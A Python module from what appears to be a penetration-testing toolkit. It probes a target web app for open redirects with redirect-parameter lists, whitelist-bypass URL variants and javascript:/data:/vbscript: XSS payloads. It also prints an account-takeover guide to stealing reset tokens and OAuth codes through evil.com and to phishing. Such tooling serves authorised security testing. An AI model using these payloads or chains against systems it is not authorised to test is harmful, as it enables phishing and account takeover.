"""
modules/open_redirect.py
tmrswrr - Open Redirect Testing
URL parameter manipulation, whitelist bypass, scheme abuse
"""
import os
import urllib.parse

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    section,
    success,
)
from utils.http import get_client


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


#: Canary host used to prove the redirect leaves the application.
CANARY_HOST = "yeepforge-canary.example.net"


def _check_redirect(url, params=None):
    """Return the Location header(s) of a redirect response, if any."""
    resp = get_client().safe_get(url, allow_redirects=False)
    if resp is None:
        return []
    loc = resp.headers.get("Location", "")
    return [loc.strip()] if loc else []


def _redirect_target(resp):
    """The Location header of a non-followed redirect, or ''."""
    if resp is None or resp.status_code not in (301, 302, 303, 307, 308):
        return ""
    return (resp.headers.get("Location") or "").strip()


def _redirects_to(location: str, host: str) -> bool:
    """True when `location` actually navigates to `host`.

    Substring matching is what made this module noisy: a redirect back to
    /login?next=https://evil.com *contains* the canary without going there.
    Only the resolved host of the Location value counts.
    """
    if not location:
        return False
    candidate = location.strip()
    # Protocol-relative ('//evil.com') and backslash variants still navigate off-site.
    normalised = candidate.replace("\\", "/")
    if normalised.startswith("//"):
        normalised = "https:" + normalised
    try:
        parsed = urllib.parse.urlsplit(normalised)
    except ValueError:
        return False
    hostname = (parsed.hostname or "").lower()
    host = host.lower()
    # Match the host itself or a subdomain of it - not 'nothost.example.net'.
    return hostname == host or hostname.endswith("." + host)


def _dangerous_scheme(location: str) -> str:
    """The dangerous scheme a Location header hands to the browser, or ''."""
    if not location:
        return ""
    # Leading whitespace/NUL are stripped by browsers before scheme parsing.
    cleaned = location.strip().strip("\x00").lstrip()
    scheme = cleaned.split(":", 1)[0].lower() if ":" in cleaned else ""
    return scheme if scheme in ("javascript", "data", "vbscript") else ""


def discover_redirect_params():
    section("OPEN REDIRECT PARAMETER DISCOVERY")
    url = _target()

    # Common redirect parameters
    params = [
        "redirect", "redirect_uri", "redirect_url", "return", "returnTo",
        "return_url", "next", "next_url", "url", "goto", "target", "dest",
        "destination", "redir", "ref", "referrer", "out", "view",
        "callback", "q", "continue", "back", "backurl", "forward",
        "location", "page", "site", "link", "jump", "to",
    ]

    info(f"Testing {len(params)} common redirect parameters...")
    canary = f"https://{CANARY_HOST}/redirect-test"
    found = []
    client = get_client()

    for param in params:
        resp = client.safe_get(url, params={param: canary}, allow_redirects=False)
        if resp is None:
            print(f"  {DIM}[!] ?{param}= (request failed){RST}")
            continue
        location = _redirect_target(resp)
        if _redirects_to(location, CANARY_HOST):
            success(f"OPEN REDIRECT via ?{param}= → {location}")
            found.append(param)
            add_vuln("Open Redirect", "High", "A01:2021",
                     f"Parameter '{param}' sends the browser to an attacker-controlled "
                     f"host: HTTP {resp.status_code} Location: {location}",
                     resp.evidence.url, evidence=resp.evidence,
                     confidence="Confirmed", cwe="CWE-601")
        else:
            print(f"  {DIM}[-] ?{param}={RST}")

    if found:
        info(f"Vulnerable parameters: {', '.join(found)}")
    return found


def whitelist_bypass():
    section("REDIRECT WHITELIST BYPASS TECHNIQUES")
    url = _target()
    param = prompt("Redirect parameter name (e.g. redirect, next)")
    legit = prompt("Allowed domain (e.g. trusted.com)")
    if not param or not legit:
        return

    evil = CANARY_HOST
    bypasses = [
        f"https://{evil}",
        f"https://{evil}@{legit}",
        f"https://{legit}.{evil}",
        f"https://{legit}%2F@{evil}",
        f"https://{legit}%40{evil}",
        f"http://{evil}%23{legit}",
        f"https://{evil}?next={legit}",
        f"https://{evil}\\{legit}",
        f"https://{evil}%5c{legit}",
        f"//{evil}",
        f"\\/\\/{evil}",
        f"////{evil}",
        f"https:{evil}",
        f"HTTPS://{evil}",
        f"https://{legit}/{evil}/../../../../../evil",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]

    info(f"Testing {len(bypasses)} whitelist bypass variants...")
    print()
    client = get_client()
    for bypass in bypasses:
        resp = client.safe_get(url, params={param: bypass}, allow_redirects=False)
        if resp is None:
            print(f"  {DIM}[!] {bypass[:60]} (request failed){RST}")
            continue
        loc = _redirect_target(resp)
        if not loc:
            print(f"  {DIM}[-] {bypass[:60]} (no redirect){RST}")
            continue
        scheme = _dangerous_scheme(loc)
        if _redirects_to(loc, evil):
            success(f"BYPASS: {bypass[:60]} → {loc}")
            add_vuln("Open Redirect Whitelist Bypass", "High", "A01:2021",
                     f"Whitelist bypassed with '{bypass}' - Location: {loc}",
                     resp.evidence.url, evidence=resp.evidence,
                     confidence="Confirmed", cwe="CWE-601")
        elif scheme:
            success(f"BYPASS ({scheme}:): {bypass[:60]} → {loc}")
            add_vuln("Open Redirect with Dangerous Scheme", "Critical", "A03:2021",
                     f"Location header hands the browser a {scheme}: URL: {loc}",
                     resp.evidence.url, evidence=resp.evidence,
                     confidence="Confirmed", cwe="CWE-601")
        else:
            print(f"  {DIM}[-] {bypass[:60]} → {loc[:40]}{RST}")


def scheme_abuse():
    section("SCHEME ABUSE - javascript: / data: / vbscript:")
    url = _target()
    param = prompt("Redirect parameter name")
    if not param:
        return

    schemes = [
        "javascript:alert(document.domain)",
        "javascript:alert(1)",
        "javascript://comment%0aalert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
        "\x00javascript:alert(1)",
        " javascript:alert(1)",
        "JAVASCRIPT:alert(1)",
    ]

    info("Testing dangerous scheme injection in redirect parameter...")
    client = get_client()
    for s in schemes:
        resp = client.safe_get(url, params={param: s}, allow_redirects=False)
        if resp is None:
            print(f"  {DIM}[!] {s[:50]} (request failed){RST}")
            continue
        # What matters is the scheme the *browser is sent to*. The previous
        # check searched the response body for 'javascript', which fires on
        # any page that ships JavaScript - i.e. nearly every page.
        loc = _redirect_target(resp)
        scheme = _dangerous_scheme(loc)
        if scheme:
            success(f"{scheme.upper()} SCHEME ACCEPTED: {s[:50]} → {loc}")
            add_vuln("Open Redirect with XSS (javascript: scheme)", "Critical", "A03:2021",
                     f"Redirect parameter accepted a {scheme}: URL - Location: {loc}",
                     resp.evidence.url, evidence=resp.evidence,
                     confidence="Confirmed", cwe="CWE-601")
        else:
            print(f"  {DIM}[-] {s[:50]}{RST}")


def open_redirect_chain():
    section("OPEN REDIRECT → ACCOUNT TAKEOVER CHAIN")
    print(f"""
  {NEON_CYN}How Open Redirect enables account takeover:{RST}

  {NEON_GRN}[1] Password Reset Token Theft:{RST}
    1. Attacker initiates password reset for victim@target.com
    2. Finds open redirect: /reset?token=XYZ&next=/REDIRECT
    3. Sends victim: target.com/reset?token=XYZ&next=//evil.com
    4. Victim clicks link - token leaks in Referer header to evil.com

  {NEON_GRN}[2] OAuth Authorization Code Theft:{RST}
    Combine open redirect with OAuth redirect_uri validation bypass
    /oauth/authorize?redirect_uri=target.com/openredirect?url=evil.com
    → Authorization code sent to evil.com

  {NEON_GRN}[3] Phishing Amplification:{RST}
    Use trusted domain's open redirect to craft phishing URLs
    target.com/redirect?to=evil.com/fake-login → Users trust target.com

  {NEON_CYN}Tools:{RST}
    openredirex: pip install openredirex
    openredirex -l urls.txt -p {"{PAYLOAD}"}
""")


def run():
    print_banner("OPEN REDIRECT", "URL Redirect Bypass · Whitelist Abuse · Scheme Injection")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Discover Redirect Parameters {SOFT_WHITE}(30+ common params){RST}
  {NEON_CYN}[2]{RST} Whitelist Bypass Techniques  {SOFT_WHITE}(17 bypass variants){RST}
  {NEON_CYN}[3]{RST} Scheme Abuse                 {SOFT_WHITE}(javascript:, data:, vbscript:){RST}
  {NEON_CYN}[4]{RST} Open Redirect → Account Takeover Chain
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": discover_redirect_params()
        elif c == "2": whitelist_bypass()
        elif c == "3": scheme_abuse()
        elif c == "4": open_redirect_chain()
        save_session()
